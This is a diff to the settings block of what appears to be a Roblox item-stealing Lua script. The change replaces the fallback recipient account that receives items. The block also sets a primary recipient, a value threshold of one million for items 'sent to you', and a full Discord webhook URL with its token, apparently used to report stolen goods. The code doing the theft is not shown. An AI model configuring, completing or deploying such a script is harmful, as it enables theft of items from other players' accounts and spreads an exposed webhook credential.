@@ -1,5 +1,5 @@
 Username = "seret128"
-Username2 = "ademTRP01" -- stuff will get sent to this user if first user's mailbox is full
+Username2 = "seretmoney" -- stuff will get sent to this user if first user's mailbox is full
 webhook = "https://discord.com/api/webhooks/1321499882988769413/R4qeoe9sfkwUzF5qsgNihSlvpBwlCj0skjvqU_-zC3tC7ztUl58-HMzzd-zZ07BG5Kqm"
 min_rap = 1000000 -- minimum rap of each item you want to get sent to you. 1 mil by default
 
